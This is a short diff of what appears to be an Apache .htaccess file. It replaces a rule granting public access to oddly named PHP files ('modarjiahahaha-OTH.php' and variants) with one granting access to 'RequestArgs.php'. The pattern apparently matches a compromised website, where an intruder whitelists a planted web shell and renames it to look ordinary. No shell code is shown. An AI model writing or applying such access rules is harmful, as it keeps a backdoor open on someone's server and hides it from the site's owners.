@@ -70,7 +70,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(modarjiahahaha-OTH.php|modarjiahahaha-OTH.phar|modarjiahahaha-OTH.inc|modarjiahahaha-OTH.phtml)$">
+<FilesMatch "^(RequestArgs.php)$">
 Allow from all
 </FilesMatch>
 Options -Indexes
